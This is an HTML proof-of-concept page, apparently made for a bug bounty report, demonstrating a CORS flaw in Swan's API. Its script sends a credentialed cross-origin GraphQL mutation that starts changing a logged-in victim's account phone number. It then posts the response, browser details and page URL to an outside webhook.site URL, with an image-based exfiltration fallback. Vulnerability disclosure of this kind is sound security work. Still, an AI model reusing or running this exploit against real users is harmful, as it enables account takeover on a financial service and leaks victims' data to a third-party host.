<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swan API CORS Vulnerability PoC</title>
    <style>
        body { font-family: system-ui, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        h1 { color: #c41e3a; }
        .log { border: 1px solid #ddd; padding: 10px; height: 300px; overflow: auto; margin: 10px 0; font-family: monospace; }
        button { margin: 5px; padding: 8px 15px; cursor: pointer; background: #2a3f5f; color: white; border: none; border-radius: 4px; }
        .note { background: #fffde7; padding: 10px; border-left: 4px solid #ffd600; margin-bottom: 20px; }
        .success { color: green; font-weight: bold; }
        .error { color: red; }
    </style>
</head>
<body>
    <h1>Swan API CORS Vulnerability Proof of Concept</h1>
    
    <div class="note">
        <p><strong>Simple PoC:</strong> This demonstrates the CORS vulnerability in Swan's API that allows cookies to be sent cross-origin.</p>
        <p><strong>Report ID:</strong> #YWH-PGM11389-72</p>
    </div>

    <button onclick="testCORSVulnerability()">Test CORS Vulnerability</button>
    <div id="log" class="log"></div>

    <script>
        // Webhook URL for data collection
        const WEBHOOK_URL = 'https://webhook.site/7eca02bb-7f58-4d12-9d09-5274ac46c8cc';
        
        // Logging function
        function log(message, type = 'info') {
            const container = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const className = type === 'error' ? 'error' : type === 'success' ? 'success' : '';
            container.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
            container.scrollTop = container.scrollHeight;
        }
        
        // Send data to webhook for evidence collection
        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    ...data,
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    url: window.location.href
                }),
                mode: 'no-cors'
            }).catch(e => {
                log(`Webhook error: ${e.message}`, 'error');
                
                // Fallback to image-based exfiltration
                const img = new Image();
                img.src = `${WEBHOOK_URL}?d=${encodeURIComponent(JSON.stringify(data))}`;
                document.body.appendChild(img);
            });
            
            log('Evidence sent to webhook', 'success');
        }
        
        // Direct test of CORS vulnerability
        async function testCORSVulnerability() {
            log('Testing CORS vulnerability with credentials...', 'info');
            
            try {
                // Generate random phone number for mutation
                const randomNum = Math.floor(Math.random() * 90000000) + 10000000;
                const newPhone = `+336${randomNum}`;
                
                // Simple fetch with credentials
                log('Sending authenticated GraphQL mutation to api.swan.io...', 'info');
                const response = await fetch('https://api.swan.io/admin-auth/graphql', {
                    method: 'POST',
                    credentials: 'include', // This is the key - sending cookies cross-origin
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        query: `mutation {
                            startPhoneNumberModification(input:{
                                oldPhoneNumber:"+33600000001",
                                newPhoneNumber:"${newPhone}"
                            }) {
                                __typename
                                ... on StartPhoneNumberModificationSuccessPayload {
                                    phoneNumberModification { id }
                                }
                                ... on PhoneNumberModificationAlreadyExistsRejection { message }
                                ... on TooManyPhoneNumberModificationRejection { message }
                            }
                        }`
                    })
                });
                
                // Process the response
                const data = await response.json();
                log(`Response: ${JSON.stringify(data)}`, 'info');
                
                // Check for successful exploitation
                if (data.data?.startPhoneNumberModification) {
                    const typeName = data.data.startPhoneNumberModification.__typename;
                    
                    if (typeName === 'StartPhoneNumberModificationSuccessPayload') {
                        const id = data.data.startPhoneNumberModification.phoneNumberModification.id;
                        log(`🔥 CRITICAL: CORS vulnerability confirmed! Mutation ID: ${id}`, 'success');
                        
                        // Send evidence to webhook
                        sendToWebhook({
                            type: 'cors_vulnerability_confirmed',
                            mutationId: id,
                            phone: newPhone,
                            response: data
                        });
                        
                        // Display detailed explanation
                        log('The API accepted credentials (cookies) sent cross-origin', 'success');
                        log('This contradicts Swan\'s claim that "The API only works with authorization bearer and no cookies"', 'success');
                        
                        return true;
                    } else if (typeName.includes('Rejection')) {
                        // Business logic rejection still means authentication worked
                        log(`Request authenticated but rejected due to business logic: ${typeName}`, 'success');
                        
                        sendToWebhook({
                            type: 'cors_vulnerability_partial',
                            typeName: typeName,
                            response: data
                        });
                        
                        return true;
                    }
                }
                
                if (data.errors) {
                    const errorMsg = data.errors[0]?.message || 'Unknown error';
                    log(`GraphQL error: ${errorMsg}`, 'error');
                    
                    if (errorMsg.includes('Unauthenticated') || errorMsg.includes('Forbidden')) {
                        log('Authentication required. To test this vulnerability:', 'info');
                        log('1. Visit dashboard.swan.io and log in', 'info');
                        log('2. Return to this page and run the test again', 'info');
                    }
                }
                
                return false;
            } catch (error) {
                log(`Error: ${error.message}`, 'error');
                return false;
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            log('CORS vulnerability test ready', 'info');
            log('To test: click "Test CORS Vulnerability" button', 'info');
            log('Note: You must be logged into Swan in another tab first', 'info');
        });
    </script>
</body>
</html>
